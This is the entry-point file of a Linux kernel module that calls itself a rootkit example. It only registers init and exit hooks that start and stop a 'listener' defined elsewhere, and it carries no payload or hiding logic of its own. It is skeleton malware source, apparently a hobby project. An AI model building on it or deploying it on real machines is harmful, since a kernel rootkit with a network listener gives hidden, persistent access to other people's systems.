#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include "rootkit.h"

#define SUCCESS 0

static int __init rootkit_init(void)
{
    int ret = SUCCESS;
    ret = listener_init();
    return SUCCESS;
}

static void __exit rootkit_exit(void)
{
    listener_cleanup();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xdvir");
MODULE_DESCRIPTION("A rootkit example for fun");
